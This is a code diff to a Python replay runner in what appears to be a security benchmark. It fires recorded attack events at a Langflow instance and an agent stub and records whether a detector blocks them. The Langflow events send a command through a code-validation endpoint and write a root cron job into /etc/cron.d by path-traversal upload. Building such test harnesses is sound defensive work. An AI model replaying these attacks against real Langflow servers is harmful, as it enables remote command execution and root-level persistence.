@@ -1,7 +1,9 @@
 import json
+import hashlib
 import os
 import pathlib
 import sys
+import time
 
 import httpx
 
@@ -22,9 +24,12 @@ def plan_actions(events: list[dict]) -> list[dict]:
     # 回放动作严格按 t 排序，保证同一 corpus 每次产生相同顺序。
     for event in sorted(events, key=lambda item: item["t"]):
         event_input = event["input"]
-        # Cat-1 公开事件保留利用参数，runner 由 exploit 字段识别 Langflow 路径。
-        if event_input.get("exploit"):
-            actions.append({"instance_id": event["instance_id"], "target": "langflow", "exploit": event["input"]["exploit"], "cmd": event["input"]["cmd"]})
+        # Cat-1 replay routing uses a generic operation name, never a
+        # scenario identifier.  The detector receives only the resulting
+        # Langflow HTTP request.
+        if event_input.get("operation") in {"code_validation", "file_upload"}:
+            exploit = "C1-A" if event_input["operation"] == "code_validation" else "C1-B"
+            actions.append({"instance_id": event["instance_id"], "target": "langflow", "exploit": exploit, "cmd": event_input["cmd"]})
         elif event_input.get("source"):
             # Cat-2 公开事件走自然语言 prompt 入口，source 只表示外部输入来源。
             body = {"model": "opspilot-stub", "prompt": event_input["prompt"]}
@@ -79,20 +84,45 @@ def clear_trajectories() -> None:
     response.raise_for_status()
 
 
-def replay_events(events: list[dict], only: str | None = None):
+def _observation(action: dict, *, status: int | None, body: bytes = b"", started: float, error: str | None = None) -> dict:
+    blocked = status == 403
+    return {
+        "instance_id": action["instance_id"],
+        "request_id": action["instance_id"],
+        "status": status,
+        "valid": error is None,
+        "timeout": isinstance(error, str) and "timeout" in error.lower(),
+        "decision": "block" if blocked else ("allow" if error is None else "unknown"),
+        "e2e_latency_ms": round((time.perf_counter() - started) * 1000, 3),
+        "business_success": bool(status is not None and 200 <= status < 300 and not blocked),
+        # Side-effect probes are filled by the benchmark harness after the
+        # request.  A successful HTTP response alone is not proof of safety.
+        "side_effect_reached": None,
+        "side_effect_probe_refs": [],
+        "response_body_sha256": hashlib.sha256(body).hexdigest() if body else None,
+        "error": error,
+    }
+
+
+def replay_events(events: list[dict], only: str | None = None) -> list[dict]:
     if only and only != "all":
-        events = [event for event in events if event["scenario"] == only]
+        # New public corpora intentionally omit scenario labels.  Filtering
+        # is therefore available only for legacy corpora that explicitly
+        # carry the field; generated runs filter before sanitization.
+        events = [event for event in events if event.get("scenario") == only]
     # 网络执行只在人工 make replay 时发生，离线测试验证 plan_actions。
     with httpx.Client(timeout=15) as client:
         tokens = {}
         langflow_token = None
+        observations = []
         for action in plan_actions(events):
             if action["target"] == "langflow":
                 # Cat-1 模拟浏览器自动登录后的真实访问形态，token 在同一次回放中复用。
                 langflow_token = langflow_token or fetch_langflow_token(client)
-                fire_cat1(client, action, langflow_token)
+                observations.append(fire_cat1(client, action, langflow_token))
             else:
-                fire_opspilot(client, action, tokens)
+                observations.append(fire_opspilot(client, action, tokens))
+        return observations
 
 
 def select_events(events: list, only: str | None = None) -> list:
@@ -102,7 +132,14 @@ def select_events(events: list, only: str | None = None) -> list:
     return events
 
 
-def replay_generated(only: str | None = None, seed: int = 1337, total: int = 5200, malicious_target: int = 80):
+def replay_generated(
+    only: str | None = None,
+    seed: int = 1337,
+    total: int = 5200,
+    malicious_target: int = 80,
+    output_dir: str | None = None,
+):
+    output_dir = output_dir or os.getenv("AGENTRANGE_RUN_DIR")
     generated = generate(seed, total, malicious_target)
     selected = select_events(generated, only)
     public_events = [public_record(event) for event in selected]
@@ -110,9 +147,16 @@ def replay_generated(only: str | None = None, seed: int = 1337, total: int = 520
     # trajectories 只进入 llm-stub 内存，finally 保证回放失败时也清理。
     inject_trajectories(trajectory_map(selected))
     try:
-        replay_events(public_events, only=None)
+        observations = replay_events(public_events, only=None)
     finally:
         clear_trajectories()
+    if output_dir:
+        output = pathlib.Path(output_dir)
+        output.mkdir(parents=True, exist_ok=True)
+        with (output / "observations.jsonl").open("w", encoding="utf-8", newline="\n") as handle:
+            for row in observations:
+                handle.write(json.dumps(row, ensure_ascii=False, sort_keys=True) + "\n")
+    return observations
 
 
 def replay(corpus_path: str, only: str | None = None):
@@ -126,14 +170,18 @@ def fire_cat1(client: httpx.Client, action: dict, langflow_token: str):
 
     # Cat-1 直接打 Langflow 漏洞端点，但当前镜像需要 auto_login 换来的 bearer token。
     headers = {"Authorization": f"Bearer {langflow_token}"}
-    if action["exploit"] == "C1-A":
-        req = make_payload(action["cmd"])
-        response = client.post(f"{LANGFLOW}{req['path']}", headers=headers, json=req["json"])
-    else:
-        upload = make_upload(f"/etc/cron.d/{action['instance_id']}", "* * * * * root id")
-        # Langflow 会按上传文件名做去重；路径穿越文件名需要 append 模式才能稳定回放多条样本。
-        response = client.post(f"{LANGFLOW}{upload['path']}", headers=headers, params={"append": "true"}, files={"file": (upload["filename"], upload["content"])})
-    response.raise_for_status()
+    started = time.perf_counter()
+    try:
+        if action["exploit"] == "C1-A":
+            req = make_payload(action["cmd"])
+            response = client.post(f"{LANGFLOW}{req['path']}", headers=headers, json=req["json"])
+        else:
+            upload = make_upload(f"/etc/cron.d/{action['instance_id']}", "* * * * * root id")
+            # Langflow 会按上传文件名做去重；路径穿越文件名需要 append 模式才能稳定回放多条样本。
+            response = client.post(f"{LANGFLOW}{upload['path']}", headers=headers, params={"append": "true"}, files={"file": (upload["filename"], upload["content"])})
+        return _observation(action, status=response.status_code, body=response.content, started=started)
+    except httpx.HTTPError as exc:
+        return _observation(action, status=getattr(getattr(exc, "response", None), "status_code", None), started=started, error=str(exc))
 
 
 def fire_opspilot(client: httpx.Client, action: dict, tokens: dict):
@@ -143,8 +191,12 @@ def fire_opspilot(client: httpx.Client, action: dict, tokens: dict):
     headers = dict(action.get("headers", {}))
     headers["Authorization"] = f"Bearer {tokens[username]}"
     body = action["body"]
-    response = client.post(f"{OPSPILOT}/run", headers=headers, json=body)
-    response.raise_for_status()
+    started = time.perf_counter()
+    try:
+        response = client.post(f"{OPSPILOT}/run", headers=headers, json=body)
+        return _observation(action, status=response.status_code, body=response.content, started=started)
+    except httpx.HTTPError as exc:
+        return _observation(action, status=getattr(getattr(exc, "response", None), "status_code", None), started=started, error=str(exc))
 
 
 if __name__ == "__main__":
